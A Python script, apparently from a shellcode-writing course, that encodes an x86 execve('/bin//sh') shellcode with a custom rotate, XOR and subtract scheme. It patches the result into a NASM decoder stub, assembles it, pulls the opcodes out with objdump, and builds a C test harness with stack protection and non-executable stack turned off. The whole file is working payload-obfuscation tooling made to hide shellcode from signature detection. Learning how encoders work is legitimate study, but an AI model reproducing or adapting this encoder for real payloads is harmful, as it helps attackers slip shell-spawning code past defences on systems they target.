#!/usr/bin/python

import random
import sys, os


file_name = 'decoder2'


def ror(x, n, bits = 8):
    mask = (2**n) - 1
    mask_bits = x & mask
    return (x >> n) | (mask_bits << (bits - n))


def encode_shellcode(shellcode):
	encoded2 = ""

	for x in bytearray(shellcode) :
		y = ( ror(x,1) ^ 224 ) - 7
		encoded2 += '0x'
		encoded2 += '%02x,' %(y & 0xff)

	return encoded2


def create_new_file(encoded2):
	lines = open(file_name+".nasm").read().splitlines()
	new_file_lines = []
	for l in lines:
		if l.endswith("marker2"):
			new_l = "	EncodedShellcode: db "
			new_l += encoded2
			new_l += " ; marker2"
			new_file_lines.append(new_l)
		else:
			new_file_lines.append(l)
	open(file_name+".nasm",'w').write('\n'.join(new_file_lines))


def compile(file_name):
	os.system("nasm -f elf32 -o "+file_name+".o "+file_name+".nasm")
	os.system("ld  -m elf_i386 -o "+file_name+" "+file_name+".o")
	os.system("rm "+file_name+".o")


def create_new_file_shellcode(shellcode):
	file_name_shellcode = 'shellcode.c'
	lines = open(file_name_shellcode).read().splitlines()
	new_file_lines = []
	for l in lines:
		if l.endswith("marker3"):
			new_l = ''
			new_l += shellcode
			new_l += '; // marker3'
			new_file_lines.append(new_l)
		else:
			new_file_lines.append(l)
	open(file_name_shellcode,'w').write('\n'.join(new_file_lines))


def main():
	shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
	encoded2 = encode_shellcode(shellcode)
	create_new_file(encoded2)
	compile(file_name)
	cmd = "objdump -d ./"+file_name+"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'"
	shellcode = os.popen(cmd).read().splitlines()[0]
	print ("Shellcode: \n"+shellcode)
	create_new_file_shellcode(shellcode)
	os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode 2>/dev/null")
	

main()